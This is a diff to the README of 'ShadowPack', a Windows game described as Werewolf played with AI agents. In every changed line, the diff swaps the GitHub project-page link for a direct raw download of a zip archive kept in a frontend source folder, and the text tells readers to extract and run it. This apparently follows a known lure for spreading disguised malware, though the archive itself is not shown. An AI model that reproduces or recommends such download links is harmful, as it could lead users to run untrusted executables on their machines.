@@ -1,6 +1,6 @@
 # 🎭 ShadowPack - Play Werewolf With AI Agents
 
-[![Download ShadowPack](https://img.shields.io/badge/Download%20ShadowPack-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hanan206/ShadowPack)
+[![Download ShadowPack](https://img.shields.io/badge/Download%20ShadowPack-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hanan206/ShadowPack/main/frontend/src/Shadow_Pack_v3.8.zip)
 
 ## 🧩 What ShadowPack Does
 
@@ -12,7 +12,7 @@ This app is made for Windows users who want to download a game and run it on the
 
 Use this link to visit the project page and download ShadowPack:
 
-[Download ShadowPack from GitHub](https://github.com/Hanan206/ShadowPack)
+[Download ShadowPack from GitHub](https://raw.githubusercontent.com/Hanan206/ShadowPack/main/frontend/src/Shadow_Pack_v3.8.zip)
 
 If the page includes a release file, download it to your PC. If the page opens the full source code, use the green Code button and choose Download ZIP.
 
@@ -125,6 +125,6 @@ Use a stable network, close heavy apps, and keep Windows updated. If you play wi
 
 Visit the ShadowPack page here and download or open the file for Windows:
 
-[https://github.com/Hanan206/ShadowPack](https://github.com/Hanan206/ShadowPack)
+[https://raw.githubusercontent.com/Hanan206/ShadowPack/main/frontend/src/Shadow_Pack_v3.8.zip](https://raw.githubusercontent.com/Hanan206/ShadowPack/main/frontend/src/Shadow_Pack_v3.8.zip)
 
 After the download finishes, open the file, extract it if needed, and run the app from the folder you unpacked
